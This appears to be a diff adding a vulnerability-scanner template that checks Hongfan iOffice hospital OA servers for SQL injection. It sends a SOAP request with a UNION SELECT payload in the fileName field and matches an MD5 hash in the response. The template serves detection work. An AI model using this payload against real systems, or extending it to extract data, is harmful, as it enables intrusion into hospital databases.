@@ -1,0 +1,38 @@
+id: hongfan-ioffice-zyy-attfile-sqli
+
+info:
+  name: Hongfan OA zyy_AttFile.asmx File SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Hongfan OA is an information management platform developed by Hongfan Technology based on the latest technology of Microsoft. NET. The Hongfan OA system provides the hospital with OA functions and completes administrative office services such as information release, process approval, document management, schedule management, work arrangement, document transfer, online communication, etc. Hongfan collaborative office system is the most professional and successful hospital OA in China. There is a SQL injection vulnerability in Hongfan iOffice Hospital Edition, which can be used by attackers to obtain sensitive database information.
+  reference:
+    - https://gobysec.net/
+  tags: 红帆-ioffice
+
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetFileAtt"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetFileAtt xmlns="http://tempuri.org/">
+              <fileName>123' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','82161')),3,32)-- aCWL</fileName>
+            </GetFileAtt>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "3648099174dfbd954311cf9899b21d23"
